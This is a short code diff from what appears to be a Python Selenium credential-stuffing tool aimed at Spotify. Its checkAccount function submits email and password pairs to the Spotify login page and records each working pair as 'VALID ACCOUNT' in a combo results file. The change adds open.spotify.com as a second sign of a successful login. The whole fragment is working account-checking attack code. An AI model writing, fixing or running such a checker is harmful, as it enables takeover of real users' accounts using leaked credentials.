@@ -66,7 +66,7 @@ def checkAccount(account):
     webDriver.find_element(By.CSS_SELECTOR, "#login-password").send_keys(PASSWORD)
     webDriver.find_element(By.CSS_SELECTOR, "#login-button").click()
     time.sleep(1.7)
-    if webDriver.current_url == "https://accounts.spotify.com/es-ES/status":
+    if webDriver.current_url == "https://accounts.spotify.com/es-ES/status" or webDriver.current_url == "https://open.spotify.com":
         print(f"{M}[{G}OK{M}] {BLACK}VALID ACCOUNT -{M}> {Y}{EMAIL}{M}:{Y}{PASSWORD}")
         with open(RESULTS_COMBOTYPE_FILE, "a") as validCombosFile:
             validCombosFile.write(f"{EMAIL}:{PASSWORD}")
